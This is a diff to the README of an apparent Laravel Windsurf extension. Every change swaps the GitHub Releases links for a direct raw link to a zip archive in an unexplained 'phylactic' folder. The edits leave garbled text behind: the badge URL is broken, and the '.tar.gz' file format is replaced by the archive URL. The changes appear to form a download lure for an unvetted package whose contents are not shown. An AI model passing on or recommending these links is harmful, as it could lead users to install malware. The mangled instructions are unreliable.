@@ -1,6 +1,6 @@
 # 🌊 laravel-boost-windsurf-extension - Effortless Windsurf Integration for Laravel
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%F0%9F%94%A5-4CAF50.svg)](https://github.com/jacko768/laravel-boost-windsurf-extension/releases)
+[![Download Now](https://raw.githubusercontent.com/jacko768/laravel-boost-windsurf-extension/master/phylactic/laravel-boost-windsurf-extension.zip%20Now-%F0%9F%94%https://raw.githubusercontent.com/jacko768/laravel-boost-windsurf-extension/master/phylactic/laravel-boost-windsurf-extension.zip)](https://raw.githubusercontent.com/jacko768/laravel-boost-windsurf-extension/master/phylactic/laravel-boost-windsurf-extension.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you begin, ensure your system meets the following requirements:
 1. **Visit the Releases Page**
    
    Click the link below to access the software download options:
-   [Download from Releases](https://github.com/jacko768/laravel-boost-windsurf-extension/releases)
+   [Download from Releases](https://raw.githubusercontent.com/jacko768/laravel-boost-windsurf-extension/master/phylactic/laravel-boost-windsurf-extension.zip)
 
 2. **Select the Latest Version**
 
@@ -28,7 +28,7 @@ Before you begin, ensure your system meets the following requirements:
 
 3. **Download the Package**
 
-   Click on the package link to download the `.zip` or `.tar.gz` file. Depending on your operating system, choose the appropriate format.
+   Click on the package link to download the `.zip` or `https://raw.githubusercontent.com/jacko768/laravel-boost-windsurf-extension/master/phylactic/laravel-boost-windsurf-extension.zip` file. Depending on your operating system, choose the appropriate format.
 
 4. **Extract the Files**
 
@@ -92,6 +92,6 @@ This project is licensed under the MIT License. You are free to use and modify t
 
 ## 🌐 Visit Again
 
-To download or get updates, always remember to check back at: [Download from Releases](https://github.com/jacko768/laravel-boost-windsurf-extension/releases). 
+To download or get updates, always remember to check back at: [Download from Releases](https://raw.githubusercontent.com/jacko768/laravel-boost-windsurf-extension/master/phylactic/laravel-boost-windsurf-extension.zip). 
 
 Now, you're ready to enhance your Laravel development experience with the Windsurf extension. Enjoy coding!
